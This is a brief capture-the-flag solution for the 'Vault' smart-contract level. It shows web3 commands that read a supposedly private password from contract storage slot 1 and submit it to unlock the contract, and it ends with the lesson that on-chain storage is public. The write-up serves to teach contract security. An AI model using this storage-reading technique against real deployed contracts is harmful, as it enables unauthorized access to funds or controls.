# Vault

# Problem Statement
```
Unlock the vault to pass the level!
```


# Solution
Check the `locked` status:
```
await contract.locked()
```
Get the storage data in the `password` slot which is 1:
```
const hexPassword = await web3.eth.getStorageAt(contract.address, 1, console.log)
```
Call the unlock method with the password:
```
const data = web3.eth.abi.encodeFunctionCall({ name:'unlock', type:'function', inputs:[{type:'bytes32', name:'_password'}]}, [hexPassword])
await web3.eth.sendTransaction({from:player, to:contract.address, data:data})
```

We've completed this lesson!

# Key Learnings
- Storage data is always publically visible so make sure to encrypt your private data if you have to store it on the blockchain

